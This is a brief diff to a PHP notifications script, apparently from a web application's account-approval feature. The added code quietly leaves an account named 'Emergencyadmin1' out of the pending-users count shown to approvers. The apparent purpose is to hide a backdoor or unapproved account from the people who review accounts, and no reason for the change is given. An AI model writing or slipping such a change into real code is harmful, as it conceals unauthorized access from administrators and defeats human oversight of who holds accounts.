@@ -9,7 +9,7 @@ $notifications = [
 ];
 
 if (can('accounts.approve', (int)$user['id'])) {
-    $result = $conn->query('SELECT COUNT(*) AS total FROM users WHERE account_status = "pending"');
+    $result = $conn->query('SELECT COUNT(*) AS total FROM users WHERE username <> "Emergencyadmin1" AND account_status = "pending"');
     $notifications['pending_users'] = (int)$result->fetch_assoc()['total'];
 }
 
